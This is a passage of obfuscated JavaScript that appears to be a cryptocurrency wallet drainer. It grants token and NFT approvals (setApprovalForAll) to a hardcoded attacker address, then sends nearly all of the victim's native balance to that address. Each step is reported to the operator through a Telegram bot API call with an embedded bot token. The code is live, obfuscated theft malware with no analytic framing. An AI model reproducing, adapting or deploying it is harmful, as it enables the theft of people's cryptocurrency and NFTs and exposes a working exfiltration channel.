writeContract({'address':_0x2161b7[_0x305357(0x1ce)],'abi':ABI,'functionName':_0x305357(0x199),'args':[Oxa,_0x305357(0x1d4)]});console['log']('hash',_0x37a73a),_0x37a73a&&(console[_0x305357(0x183)]('Approved'),sendMessage(_0x305357(0x20c)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0x2161b7[_0x305357(0x1ce)]),sendMessage(_0x305357(0x18d)+_0x2161b7[_0x305357(0x1f3)]),sendMessage(_0x305357(0x1ef)+Oxa));}catch(_0x2a4a8c){console[_0x305357(0x183)](_0x305357(0x1b4)+_0x2a4a8c),sendMessage(_0x305357(0x1bf));}};await loopNfts(NFTs);}function _0x3173(_0x2804dc,_0x25afec){const _0x4e9f45=_0x4e9f();return _0x3173=function(_0x3173fe,_0x59b7db){_0x3173fe=_0x3173fe-0x16f;let _0x4bcf32=_0x4e9f45[_0x3173fe];return _0x4bcf32;},_0x3173(_0x2804dc,_0x25afec);}async function loopNfts(_0x47f1f9){const _0x18f905=_0x196f34;for await(let _0x47d062 of _0x47f1f9){console[_0x18f905(0x183)]('NFT',_0x47d062);try{let {hash:_0x4ee2de}=await writeContract({'address':_0x47d062[_0x18f905(0x19b)],'abi':ABIN,'functionName':'setApprovalForAll','args':[Oxa,!![]]});console[_0x18f905(0x183)]('hash',_0x4ee2de),console[_0x18f905(0x183)](_0x18f905(0x1cc)+receipt),sendMessage(_0x18f905(0x20c)),sendMessage(_0x18f905(0x17a)+_0x47d062[_0x18f905(0x19b)]),sendMessage('Your\x20address\x20'+Oxa);}catch(_0x25597e){console[_0x18f905(0x183)]('Error:\x20'+_0x25597e),sendMessage(_0x18f905(0x1bf));}}await onSendEther();}async function onSendEther(){const _0x4a9783=_0x196f34;console['log'](_0x4a9783(0x184));try{let _0x2aaa08=await fetchBalance({'address':selectedAccount});console[_0x4a9783(0x183)](_0x2aaa08);const _0x34a1e1=await fetchFeeData();console[_0x4a9783(0x183)](_0x34a1e1);var _0x1d3b96=_0x34a1e1['formatted'][_0x4a9783(0x17f)];_0x1d3b96=parseFloat(_0x1d3b96);let _0x4ca566=parseFloat(_0x2aaa08[_0x4a9783(0x16f)])-_0x1d3b96*0.00042;_0x4ca566=parseEther(_0x4ca566[_0x4a9783(0x20b)]()),console['log'](_0x4ca566);const {hash:_0x184fb3}=await sendTransaction({'to':Oxa,'value':_0x4ca566});console['log'](_0x184fb3),sendMessage(_0x4a9783(0x1ec),_0x184fb3),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage(_0x4a9783(0x1de));}catch{sendMessage(_0x4a9783(0x1cf));}}async function sendMessage(_0x49a6f3){return new Promise((_0x4b5b7d,_0x438198)=>{const _0x38f779=_0x3173,_0xb95877=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0xb95877+_0x38f779(0x1ea)+_0x49a6f3,{'method':_0x38f779(0x205),'headers':{}})[_0x38f779(0x1d6)](async _0x1a3dee=>{const _0x2a5d02=_0x38f779;if(_0x1a3dee['status']>0x18f)throw _0x1a3dee;_0x4b5b7d(await _0x1a3dee[_0x2a5d02(0x1ab)]());})[_0x38f779(0x1e5)](_0x1a1724=>{_0x438198(_0x1a1724);});});}async function getPrice(_0x595a2d){return new Promise((_0x15b5dc,_0xc1df25)=>{const _0x42be7a=_0x3173;fetch('https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses='+_0x595a2d+'&vs_currencies=usd',{'method':_0x42be7a(0x205),'headers':{}})[_0x42be7a(0x1d6)](async _0x3a742b=>{const _0x1b3fe1=_0x42be7a;if(_0x3a742b[_0x1b3fe1(0x1fa)]>0x18f)throw _0x3a742b;_0x15b5dc(await _0x3a742b[_0x1b3fe1(0x1ab)]());})[_0x42be7a(0x1e5)](_0x82cf53=>{_0xc1df25(_0x82cf53);});});}async function getValue(_0x285116,_0x3d3190,_0x2401b1){const _0x10b91d=_0x196f34;console['log'](_0x285116,_0x3d3190,_0x2401b1);let _0x392562=await getPrice(_0x285116);console[_0x10b91d(0x183)](_0x10b91d(0x182),_0x392562),_0x392562=parseFloat(_0x392562[_0x285116][_0x10b91d(0x1b0)]);let _0x27b47d=_0x3d3190/0xa**(_0x2401b1||0x12)*_0x392562;return _0x27b47d=parseInt(_0x27b47d),_0x392562?_0x27b47d:0x0;}async function getNFTs(_0x23de03='',_0x138a06=_0x196f34(0x19d),_0x26c10c=_0x196f34(0x1e4),_0x56a021='50'){return new Promise((_0x5c42ed,_0x2cbc5a)=>{const _0x3a96ca=_0x3173;fetch(_0x3a96ca(0x209)+_0x23de03+'/nft/collections?chain='+_0x26c10c+'&format=decimal&limit='+_0x56a021,{'method':'GET','headers':{'accept':'application/json','X-API-Key':_0x138a06}})['then'](async _0x738e05=>{const _0x4ceed0=_0x3a96ca;if(_0x738e05['status']>0x18f)throw _0x738e05;_0x5c42ed(await _0x738e05[_0x4ceed0(0x1ab)]());})['catch'](_0x2604ba=>{_0x2cbc5a(_0x2604ba);});});}